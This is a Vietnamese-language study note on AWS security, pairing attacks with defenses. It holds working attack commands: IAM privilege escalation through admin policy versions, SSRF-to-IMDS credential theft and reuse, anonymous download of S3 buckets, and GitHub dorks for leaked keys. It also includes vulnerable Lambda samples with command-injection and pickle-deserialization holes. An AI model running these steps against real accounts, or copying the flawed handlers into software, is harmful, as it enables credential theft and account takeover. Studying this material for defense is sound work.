# Cloud Security Deep Dive – AWS

> Phương pháp: What – How – Why – Components – Compare – Trade-offs – Real-world – Ghi chú

---

## 1. AWS IAM Security

### What – IAM Security là gì?
IAM (Identity and Access Management) là điểm kiểm soát trung tâm của AWS. Misconfigured IAM = attacker có thể leo thang từ không có gì lên toàn bộ AWS account.

### How – IAM Privilege Escalation

```
IAM Privilege Escalation Paths:
User A có iam:AttachUserPolicy → attach AdministratorAccess policy cho mình
User A có iam:CreatePolicyVersion → tạo version mới với * permissions
User A có iam:SetDefaultPolicyVersion → đặt version có full access làm mặc định
User A có iam:CreateAccessKey → tạo new access key cho existing admin user
User A có ec2:RunInstances + iam:PassRole → launch EC2 với admin role
User A có lambda:CreateFunction + iam:PassRole + lambda:InvokeFunction → create + invoke Lambda với admin role
User A có sts:AssumeRole → assume role khác có quyền cao hơn
```

```bash
# Enumerate IAM permissions (với access key)
# aws-cli
aws iam get-user
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>
aws iam get-policy-version --policy-arn <arn> --version-id v1

# Pacu: AWS exploitation framework
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu && python3 pacu.py

# Trong Pacu:
import_keys                                # import AWS credentials
run iam__bruteforce_permissions             # enumerate all permissions
run iam__privesc_scan                      # find escalation paths

# Enumerate với enumerate-iam (Python)
python3 enumerate-iam.py --access-key AKIA... --secret-key xxx...
# → Test tất cả IAM actions xem cái nào được phép

# Exploit: tạo admin policy version
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789:policy/MyPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# Exploit: attach admin policy
aws iam attach-user-policy \
  --user-name target_user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Phòng thủ:
# - Least privilege: chỉ grant permissions cần thiết
# - Permission boundaries: giới hạn tối đa của IAM entity
# - SCP (Service Control Policy) ở Organization level
# - Access Analyzer: detect overly permissive policies
# - CloudTrail: log tất cả IAM actions
```

### How – IAM Roles vs Users vs Groups

```json
// Policy structure
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {"Service": "ec2.amazonaws.com"},
      "Action": ["s3:GetObject"],
      "Resource": "arn:aws:s3:::my-bucket/*",
      "Condition": {
        "StringEquals": {
          "s3:prefix": "home/${aws:username}/"  // Dynamic policy
        },
        "IpAddress": {
          "aws:SourceIp": ["10.0.0.0/8"]
        }
      }
    },
    // DENY overrides ALLOW
    {
      "Effect": "Deny",
      "Action": ["iam:CreateUser", "iam:DeleteUser"],
      "Resource": "*",
      "Condition": {
        "BoolIfExists": {
          "aws:MultiFactorAuthPresent": "false"  // Require MFA for IAM changes
        }
      }
    }
  ]
}
```

```bash
# Permission Boundary: giới hạn max permissions của role/user
aws iam put-user-permissions-boundary \
  --user-name developer \
  --permissions-boundary arn:aws:iam::123456789:policy/DeveloperBoundary
# → developer không thể có permissions vượt DeveloperBoundary dù attach policy nào

# SCP (Service Control Policy): apply cho toàn Organization Unit
# Deny tất cả mọi thứ ngoài allowed services:
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Deny",
    "NotAction": [
      "ec2:*", "s3:*", "rds:*", "iam:*", "cloudwatch:*"
    ],
    "Resource": "*"
  }]
}

# Prevent leaving organization
{
  "Effect": "Deny",
  "Action": ["organizations:LeaveOrganization"],
  "Resource": "*"
}
```

---

## 2. EC2 & IMDS Attacks

### How – Instance Metadata Service (IMDS) Attack

```bash
# IMDS endpoint (chỉ accessible từ trong EC2):
# http://169.254.169.254/latest/

# SSRF → IMDS attack
# Vulnerable app: GET /fetch?url=http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# → Hiện tên IAM role của instance

curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyInstanceRole
# Response:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "xxx...",
  "Token": "session-token...",
  "Expiration": "2026-05-06T11:00:00Z"
}

# Sử dụng credentials:
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=xxx...
export AWS_SESSION_TOKEN=session-token...
aws sts get-caller-identity   # verify identity
aws s3 ls                     # list buckets
aws iam list-attached-role-policies --role-name MyInstanceRole  # what can I do?

# IMDSv2 (Phòng thủ): yêu cầu session token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# → SSRF thông thường không thể dùng IMDSv2 (cần PUT request trước)
# → Nhưng một số SSRF cases vẫn có thể bypass (nếu có redirect)

# Enforce IMDSv2 (không cho IMDSv1):
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \           # require IMDSv2
  --http-put-response-hop-limit 1   # 1 hop: chặn từ container inside EC2
```

### How – User Data Secrets

```bash
# EC2 User Data: script chạy khi instance launch
# Thường chứa credentials nếu developer không cẩn thận

curl http://169.254.169.254/latest/user-data
# Có thể thấy:
#!/bin/bash
export DB_PASSWORD="supersecretpassword"
export API_KEY="sk-xxxxxxxxxxxx"
aws configure set aws_access_key_id AKIA...

# Phòng thủ:
# - Không để secrets trong User Data
# - Dùng AWS Secrets Manager hoặc Parameter Store
# - Dùng IAM roles thay hardcoded credentials
```

---

## 3. S3 Security

### How – S3 Bucket Vulnerabilities

```bash
# 1. Find public buckets (OSINT)
# Common naming patterns:
# company-backups, company-data, company-dev, company-prod
# company.com.backups

# AWS CLI: list public bucket
aws s3 ls s3://company-backups --no-sign-request   # anonymous access

# Tools:
S3Scanner   # scan nhiều buckets
bucket-finder   # brute force bucket names

# 2. Bucket enumeration
aws s3 ls s3://target-bucket --no-sign-request
aws s3 ls s3://target-bucket --recursive --no-sign-request

# 3. Download files
aws s3 sync s3://target-bucket ./local-folder --no-sign-request

# 4. S3 ACL misconfigurations:
# "AllUsers" read → public read
# "AllUsers" write → public write (anyone can upload/delete!)
# "AuthenticatedUsers" → bất kỳ AWS account nào đều đọc được!

# Check bucket policy
aws s3api get-bucket-policy --bucket target-bucket
aws s3api get-bucket-acl --bucket target-bucket

# 5. Sensitive file patterns trong S3:
# .env, .env.* (environment files)
# *.sql, *.dump (database dumps)
# *.pem, *.key, *.crt (private keys)
# credentials, config.yml, settings.py
# backup.zip, db_backup.tar.gz

# Phòng thủ:
# Block Public Access (account level):
aws s3control put-public-access-block \
  --account-id 123456789 \
  --public-access-block-configuration \
  BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true

# S3 Server Access Logging:
aws s3api put-bucket-logging \
  --bucket my-bucket \
  --bucket-logging-status '{"LoggingEnabled":{"TargetBucket":"log-bucket","TargetPrefix":"s3-access/"}}'

# S3 Object Lock: Write-Once-Read-Many (WORM), compliance mode
aws s3api put-object-lock-configuration \
  --bucket compliance-bucket \
  --object-lock-configuration '{"ObjectLockEnabled":"Enabled","Rule":{"DefaultRetention":{"Mode":"COMPLIANCE","Days":365}}}'
```

---

## 4. CloudTrail & Detection Evasion

### How – CloudTrail Analysis

```bash
# CloudTrail: logs TẤT CẢ API calls (ai, khi nào, từ đâu)
# Log location: S3 bucket, CloudWatch Logs

# Tìm suspicious activities:
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin

# Enumerate tất cả events từ specific user
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=Username,AttributeValue=suspicious_user \
  --start-time 2026-05-01 --end-time 2026-05-06

# Tìm access key creation (có thể là persistence)
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateAccessKey

# Tìm policy changes
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AttachUserPolicy

# CloudWatch Metric Alarm for root login:
aws cloudwatch put-metric-alarm \
  --alarm-name RootAccountLogin \
  --metric-name RootAccountUsage \
  --namespace CloudTrailMetrics \
  --statistic Sum \
  --period 300 \
  --threshold 1 \
  --comparison-operator GreaterThanOrEqualToThreshold \
  --alarm-actions arn:aws:sns:us-east-1:123:SecurityAlerts
```

### How – GuardDuty Threats

```bash
# GuardDuty: ML-based threat detection
# Analyze: CloudTrail, VPC Flow Logs, DNS logs

# Enable GuardDuty
aws guardduty create-detector --enable

# Findings types:
# UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS
# → IMDS credentials dùng từ bên ngoài instance
# UnauthorizedAccess:EC2/TorIPCaller
# → EC2 kết nối từ Tor IP
# Recon:EC2/PortProbeUnprotectedPort
# → port scanning detected
# CryptoCurrency:EC2/BitcoinTool.B
# → crypto mining detected

# Get findings
aws guardduty list-findings --detector-id <detector-id>
aws guardduty get-findings --detector-id <detector-id> --finding-ids <id>

# Suppress findings (legitimate activities)
aws guardduty create-filter \
  --detector-id <detector-id> \
  --name SuppressInternalScan \
  --action ARCHIVE \
  --finding-criteria '{"Criterion":{"accountId":{"Eq":["123456789"]}}}'
```

---

## 5. Lambda Security

### How – Lambda Attack Vectors

```python
# 1. Event Injection
# Nếu Lambda process input data trong OS command / SQL / template:

# Vulnerable Lambda:
import subprocess
def handler(event, context):
    domain = event['domain']
    result = subprocess.run(f"nslookup {domain}", shell=True, capture_output=True)
    # → Command injection: domain = "google.com; rm -rf /tmp/*"

# 2. Over-Permissive IAM Role
# Lambda execution role với AdministratorAccess → full AWS access nếu RCE

# 3. Environment Variable Secrets
# Lambda env vars có thể read bằng GetFunctionConfiguration API
aws lambda get-function-configuration --function-name myFunction
# → Nếu role có lambda:GetFunction → lấy được secrets!

# 4. Deserialization / Event Injection
# JSON input parsed unsafe
import pickle, base64
def handler(event, context):
    data = base64.b64decode(event['payload'])
    obj = pickle.loads(data)    # RCE via pickle deserialization!

# Phòng thủ:
# - Minimum IAM role per Lambda function
# - Secrets từ Secrets Manager (không env vars)
# - Input validation và sanitization
# - Lambda Layers không chứa secrets
# - VPC isolation cho Lambda cần internal resources
```

---

## 6. Security Tooling

### How – ScoutSuite – Multi-Cloud Audit

```bash
# ScoutSuite: audit AWS/GCP/Azure security posture
pip install scoutsuite

# AWS audit
python3 scout.py aws --profile default
# → Tạo HTML report với findings categorized theo risk

# Categories:
# - IAM: MFA, password policy, unused credentials
# - S3: bucket ACLs, encryption, logging
# - EC2: security groups, IMDSv1 usage
# - RDS: public access, encryption, backup
# - CloudTrail: enabled, S3 object-level logging

# Prowler: AWS security best practices
./prowler -g group1              # CIS benchmark checks
./prowler -c check21,check22     # specific checks
./prowler -f us-east-1           # specific region
```

### How – Checklist AWS Security

```bash
# AWS Security Checklist:

# 1. Root account
aws iam get-account-summary | jq '.AccountMFAEnabled'  # MFA bật?
aws iam list-access-keys --user-name root               # không có access keys

# 2. IAM Password Policy
aws iam get-account-password-policy
# → MinimumPasswordLength >= 14
# → RequireLowercaseCharacters, RequireNumbers, RequireSymbols = true
# → MaxPasswordAge <= 90
# → PasswordReusePrevention >= 24

# 3. MFA for IAM users
aws iam list-users | jq -r '.Users[].UserName' | while read user; do
  mfa=$(aws iam list-mfa-devices --user-name "$user" | jq '.MFADevices | length')
  [ "$mfa" -eq 0 ] && echo "NO MFA: $user"
done

# 4. Access keys unused > 90 days
aws iam generate-credential-report
aws iam get-credential-report --query 'Content' --output text | base64 -d | \
  awk -F',' 'NR>1 && $9!="N/A" && $9<"2025-02-06" {print "OLD KEY:", $1, $9}'

# 5. Security Groups: kiểm tra 0.0.0.0/0 ingress
aws ec2 describe-security-groups | jq -r '
  .SecurityGroups[] |
  select(.IpPermissions[].IpRanges[]?.CidrIp == "0.0.0.0/0") |
  {GroupId: .GroupId, Name: .GroupName}'

# 6. S3 Public Access
aws s3api list-buckets --query 'Buckets[].Name' --output text | \
  tr '\t' '\n' | while read bucket; do
    public=$(aws s3api get-public-access-block --bucket "$bucket" 2>/dev/null | \
      jq '.PublicAccessBlockConfiguration.BlockPublicAcls')
    [ "$public" != "true" ] && echo "NOT BLOCKED: $bucket"
  done

# 7. CloudTrail enabled in all regions
aws cloudtrail get-trail-status --name myTrail --query 'IsLogging'
aws cloudtrail describe-trails --include-shadow-trails | \
  jq '.trailList[] | {name: .Name, multiRegion: .IsMultiRegionTrail}'

# 8. VPC Flow Logs
aws ec2 describe-flow-logs | jq '.FlowLogs | length'
# → 0 = flow logs chưa bật
```

---

### Compare – Cloud Security Tools

| Tool | Cloud | Type | Output |
|------|-------|------|--------|
| ScoutSuite | AWS/GCP/Azure | Audit/Posture | HTML report |
| Prowler | AWS | CIS/Security benchmarks | CLI/HTML/JSON |
| Pacu | AWS | Exploitation framework | CLI |
| CloudSploit | AWS/GCP/Azure | CSPM | JSON/HTML |
| TruffleHog | Any (Git/S3) | Secret scanning | CLI |
| AWS Security Hub | AWS | Aggregated findings | Console |
| GuardDuty | AWS | Threat detection | Console/EventBridge |

### Trade-offs
- IMDSv2: mitigates SSRF đến IMDS nhưng có thể break legacy apps dùng IMDSv1; cần test kỹ trước khi enforce
- Least privilege IAM: khó maintain khi app thay đổi; dùng IAM Access Analyzer để detect unused permissions
- GuardDuty false positives: pentest activities sẽ trigger alerts → notify security team trước khi pentest
- VPC Flow Logs: cost cao nếu nhiều traffic; dùng sampling hoặc chọn VPCs quan trọng

### Real-world Usage
```bash
# Tìm forgotten/exposed credentials
# 1. GitHub dorks
# "amazonaws.com" "AKIA" filename:.env
# "AWS_SECRET_ACCESS_KEY" language:python

# 2. TruffleHog scan Git history
trufflehog git https://github.com/company/repo --only-verified

# 3. Giả mạo compromised credentials (check validity)
aws sts get-caller-identity
# → nếu trả về identity → credentials valid!

# 4. Determine blast radius
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123:user/compromised \
  --action-names 's3:*' 'ec2:*' 'iam:*' \
  | jq '.EvaluationResults[] | select(.EvalDecision=="allowed") | .EvalActionName'
```

### Ghi chú – Chủ đề tiếp theo
> Malware Analysis – Static analysis (strings, PE headers, YARA), Dynamic analysis (sandbox, behavioral), Reverse Engineering cơ bản
> Incident Response – Memory forensics với Volatility, disk forensics, log analysis, DFIR playbook

---

*Cập nhật lần cuối: 2026-05-06*
